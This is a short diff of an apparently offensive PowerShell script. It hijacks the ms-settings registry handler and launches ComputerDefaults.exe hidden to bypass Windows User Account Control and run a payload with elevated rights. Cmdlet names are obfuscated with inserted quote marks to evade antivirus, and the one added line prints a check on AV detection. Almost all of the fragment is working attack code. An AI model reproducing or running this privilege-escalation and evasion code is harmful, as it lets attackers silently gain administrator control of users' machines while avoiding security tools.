@@ -273,6 +273,7 @@ N'e'W-I'te'm "HKCU:\software\classes\ms-settings\shell\open\command" -Force|OUT-
 sleep(5.3);
 se'T-iT'EmP'rop'erty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "$Request" -force|OUT-NULL
 sleep(7.3);
+write-host "Check AvS Detection:"
 n'Ew-I'te'mPr'operty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force |OUT-NULL;(![BOOL]);sleep(9.3);
 Start-Process -WindowStyle hidden "C:\Windows\System32\ComputerDefaults.exe"
 }
